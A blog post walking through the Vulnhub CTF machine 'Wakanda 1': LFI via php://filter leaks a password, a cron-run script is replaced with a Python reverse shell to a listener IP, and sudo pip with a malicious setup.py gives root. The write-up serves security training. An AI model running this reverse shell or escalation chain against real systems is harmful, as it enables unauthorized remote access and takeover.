---
layout: post
title:  "To the lands of Wakanda 1"
subtitle: "Breaching the bearier of Wakanda"
categories: [itsec,English,CTF,vulnhub]
---

![Wakanda Meme](https://i.imgur.com/htpAhn5.png) 

I created a new ToDo-List for CTF VM's from Vulnhub, you see it here:

<blockquote class="twitter-tweet" data-lang="de"><p lang="en" dir="ltr">My ToDo :)<a href="https://twitter.com/hashtag/Pentesting?src=hash&amp;ref_src=twsrc%5Etfw">#Pentesting</a> <a href="https://twitter.com/hashtag/challenge?src=hash&amp;ref_src=twsrc%5Etfw">#challenge</a> <br>All downloadable at <a href="https://twitter.com/VulnHub?ref_src=twsrc%5Etfw">@VulnHub</a> <a href="https://t.co/pjIgn5LImy">pic.twitter.com/pjIgn5LImy</a></p>&mdash; ???????????? (@wirehack7) <a href="https://twitter.com/wirehack7/status/1028628836043448320?ref_src=twsrc%5Etfw">12. August 2018</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>


So I solved [Wakanda 1](https://www.vulnhub.com/entry/wakanda-1,251/) and I want to share with you my walkthrough. Let's start!

* Will be replaced with the ToC, excluding the "Contents" header
{:toc}
## Information

It's a Linux machine, the level to beat it is *intermediate*. There are 3 flags to retrieve, `flag1.txt`, `flag2.txt` and `root.txt`.

No more info is given, just that the machine assigns it's IP via DHCP.
So, let's follow the path.

Machine is created by [@xMagass](https://twitter.com/xMagass)

## First contact

We need to get known which IP has been assigned to the box, for that we can simply use [ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol). Let's fire up `arp-scan`:

```bash
root@kali:~# arp-scan -I eth1 --localnet
Interface: eth1, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.20.20.1	00:50:56:c0:00:02	VMware, Inc.
10.20.20.128	00:0c:29:58:df:e5	VMware, Inc.
10.20.20.254	00:50:56:f6:0e:cd	VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9: 256 hosts scanned in 2.292 seconds (111.69 hosts/sec). 3 responded
```

This simply requests all IP addresses for the network which is assigned to the interface `eth1`.  We see that the box has the IP `10.20.20.128`, as the other IP's are system IP's inside of the internal VMWare Workstation network.

Scan it:

```bash
root@kali:~# nmap -A -T5 -p- 10.20.20.128
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-15 19:29 CEST
Nmap scan report for 10.20.20.128
Host is up (0.00044s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Vibranium Market
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          56610/udp  status
|_  100024  1          58518/tcp  status
3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
58518/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:58:DF:E5 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms 10.20.20.128

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.87 seconds
```

Out of curiosity, let's focus on the HTTP port.

It shows us that:

![img](https://i.imgur.com/ru1zann.png) 

No links are working. A bit dirbusting didn't show interesting files or directories. But when looking at the HTML source code I found that: `<!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->`. An anchor link with wrong ending tag, showing us an interesting detail: it looks like a variable is beeing used to show language dependent content. With dirbusting I found the file `fr.php`, so what I'm thinking is that if just includes a file and appends `.php` to it. The GET variable `flag` could be vulnerable to [LFI](https://en.wikipedia.org/wiki/File_inclusion_vulnerability), [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#wrapper-input) you find a nice tutorial about it.

## Getting in

So we might found our first rabbit hole to jump in. Take a breath and then process further!

### Information gathering through LFI

Through LFI we might be able to include a file which is not intended to be included. As it looks like it just includes a file via `include($_GET['lang'].'.php');` we should be able to include every PHP file. Just PHP files. Why? Because it always adds `.php` at the end. When simply doing `?lang=index` it will fail because there would be an infinite loop in including `index.php`. But there is another technique, via `php://filter`. This runs directly a PHP I/O and processes it through the [*filter*](http://php.net/manual/de/filters.php) library. So let's test:

![](https://i.imgur.com/pfot0U3.jpg)

We are getting the content as *base64* because we don't want the PHP code to be parsed by the interpreter. Decoding it gives us:

```php+HTML
<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}

?>



<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Vibranium market">
    <meta name="author" content="mamadou">

    <title>Vibranium Market</title>


    <link href="bootstrap.css" rel="stylesheet">

    
    <link href="cover.css" rel="stylesheet">
  </head>

  <body class="text-center">

    <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
      <header class="masthead mb-auto">
        <div class="inner">
          <h3 class="masthead-brand">Vibranium Market</h3>
          <nav class="nav nav-masthead justify-content-center">
            <a class="nav-link active" href="#">Home</a>
            <!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
          </nav>
        </div>
      </header>

      <main role="main" class="inner cover">
        <h1 class="cover-heading">Coming soon</h1>
        <p class="lead">
          <?php
            if (isset($_GET['lang']))
          {
          echo $message;
          }
          else
          {
            ?>

            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!
            <?php
          }
?>
        </p>
        <p class="lead">
          <a href="#" class="btn btn-lg btn-secondary">Learn more</a>
        </p>
      </main>

      <footer class="mastfoot mt-auto">
        <div class="inner">
          <p>Made by<a href="#">@mamadou</a></p>
        </div>
      </footer>
    </div>



  

</body></html>
```

There is a password given. If you look also at the footer of the site we also mention a name: `mamadou`.

### Getting flag1.txt

Looking back to the NMAP scan we see also an open SSH port there. Let's try these credentials:
`mamadou:Niamey4Ever227!!!`.

```shell
root@kali:~/vulnhub/wakanda# ssh -p 3333 mamadou@10.20.20.128
mamadou@10.20.20.128's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug  3 15:53:29 2018 from 192.168.56.1
Python 2.7.9 (default, Jun 29 2016, 13:08:31) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```

Oh nice, Python as shell. We can easily escape that "jail" with `import pty; pty.spawn("/bin/sh")`. Basic enumeration and obtaining the first flag:

```shell
$ ls -al
total 24
drwxr-xr-x 2 mamadou mamadou 4096 Aug  5 02:24 .
drwxr-xr-x 4 root    root    4096 Aug  1 15:23 ..
lrwxrwxrwx 1 root    root       9 Aug  5 02:24 .bash_history -> /dev/null
-rw-r--r-- 1 mamadou mamadou  220 Aug  1 13:15 .bash_logout
-rw-r--r-- 1 mamadou mamadou 3515 Aug  1 13:15 .bashrc
-rw-r--r-- 1 mamadou mamadou   41 Aug  1 15:52 flag1.txt
-rw-r--r-- 1 mamadou mamadou  675 Aug  1 13:15 .profile
$ cat flag1.txt

Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mamadou:x:1000:1000:Mamadou,,,,Developper:/home/mamadou:/usr/bin/python
devops:x:1001:1002:,,,:/home/devops:/bin/bash
$ sudo -l
[sudo] password for mamadou: 
Sorry, user mamadou may not run sudo on Wakanda1.
```

We obtained our first flag, also we see that there is another user: `devops`. User `mamadou` is not allowed to run any **sudo** commands \*sigh\*.

### Obtain flag2.txt

I bet we have to gain access to the system as `devops`. Let's find files which are owned by this user:

```
$ find / -user devops 2>/dev/null
/srv/.antivirus.py
/tmp/test
/home/devops
/home/devops/.bashrc
/home/devops/.profile
/home/devops/.bash_logout
/home/devops/flag2.txt
$ find / -user devops -writable 2>/dev/null
/srv/.antivirus.py
```

First command shows which files are owned by user `devops`. The second one shows which are owned by the user and which are writeable by the current user. `2>/dev/null` suppresses any error, like "*Permission denied*".

```shell
$ cat /srv/.antivirus.py
open('/tmp/test','w').write('test')
```

This looks like it's periodically executed (as of my experience from CTF boxes). Building a reverse shell with it: (I checked if `nc` is installed and if it allows the parameter `-e`)

```shell
$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.20.138",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /srv/.antivirus.py
```
Listen to it: `nc -lvnp 4444` (on your local machine). And then wait... (mostly ~15min, maybe it is really a cronjob. If not :sob:)

```shell
listening on [any] 4444 ...
connect to [10.20.20.138] from (UNKNOWN) [10.20.20.128] 41727
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(devops) gid=1002(developer) groups=1002(developer)
$ ls -al /home/devops
total 24
drwxr-xr-x 2 devops developer 4096 Aug  5 02:25 .
drwxr-xr-x 4 root   root      4096 Aug  1 15:23 ..
lrwxrwxrwx 1 root   root         9 Aug  5 02:25 .bash_history -> /dev/null
-rw-r--r-- 1 devops developer  220 Aug  1 15:23 .bash_logout
-rw-r--r-- 1 devops developer 3515 Aug  1 15:23 .bashrc
-rw-r----- 1 devops developer   42 Aug  1 15:57 flag2.txt
-rw-r--r-- 1 devops developer  675 Aug  1 15:23 .profile
$ cat /home/devops/flag2.txt
Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098
$ sudo -l
Matching Defaults entries for devops on Wakanda1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip
```

Yay, it worked! We have our 2nd flag. Move on!

### r00ted, flag root.txt

We see that `devops` is allowed to run `/usr/bin/pip` with no password, that would be the only command we could run as we don't know the password of the user.

And this took me a long time to find any useful information about it. Googling "pip privilege escalation" brought me to nothing. Finally "sudo pip exploit" brought me the Github repo [FakePip](https://github.com/0x00-0x00/FakePip).

(Yes, I know I was lazy. I could have also read about pip and how it processes files and thinking of writing my own exploit. But meh, you know... :sleepy:)

There we see that a "malicious" (let's call it that way) `setup.py` is being processed by **pip**. This will run also commands inside of `setup.py`. 

Just change the IP in the file.

Then run it after listening to port *443* via `nc`:

```shell
==[ On local machine ]=========

root@kali:~/vulnhub/wakanda# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...

==[ On remote machine ]=========

$ sudo /usr/bin/pip install . --upgrade --force-reinstall
Unpacking /home/devops
  Running setup.py (path:/tmp/pip-gDsHVR-build/setup.py) egg_info for package from file:///home/devops
    
Installing collected packages: FakePip
  Running setup.py install for FakePip
    
==[ In our nc on port 443 ]=========

listening on [any] 443 ...
connect to [10.20.20.138] from (UNKNOWN) [10.20.20.128] 58485
root@Wakanda1:/tmp/pip-gDsHVR-build# id
id
uid=0(root) gid=0(root) groups=0(root)
root@Wakanda1:/tmp/pip-gDsHVR-build# cd /root
cd /root
root@Wakanda1:~# ls -al
ls -al
total 20
drwx------  2 root root 4096 Aug  5 02:26 .
drwxr-xr-x 22 root root 4096 Aug  1 13:05 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r-----  1 root root  429 Aug  1 15:16 root.txt
root@Wakanda1:~# cat root.txt
cat root.txt
 _    _.--.____.--._
( )=.-":;:;:;;':;:;:;"-._
 \\\:;:;:;:;:;;:;::;:;:;:\
  \\\:;:;:;:;:;;:;:;:;:;:;\
   \\\:;::;:;:;:;:;::;:;:;:\
    \\\:;:;:;:;:;;:;::;:;:;:\
     \\\:;::;:;:;:;:;::;:;:;:\
      \\\;;:;:_:--:_:_:--:_;:;\
       \\\_.-"             "-._\
        \\
         \\
          \\
           \\ Wakanda 1 - by @xMagass
            \\
             \\


Congratulations You are Root!

821ae63dbe0c573eff8b69d451fb21bc

root@Wakanda1:~# 

```

We have the last flag! This worked because `pip` has been run with sudo privileges. Then the code in `setup.py` has been processed, there was a reverse shell included. Connecting back to our local VM with running `/bin/sh`. This created a shell environment for us.

## Conclusion

The machine was a nice and short trip. Gaining access as user was not that hard, but finding the way to exploit `pip` was fun. I knew that `pip` runs setup routines, but not how to abuse them.

Nice work @xMagass! Looking forward to your next boxes! :smile: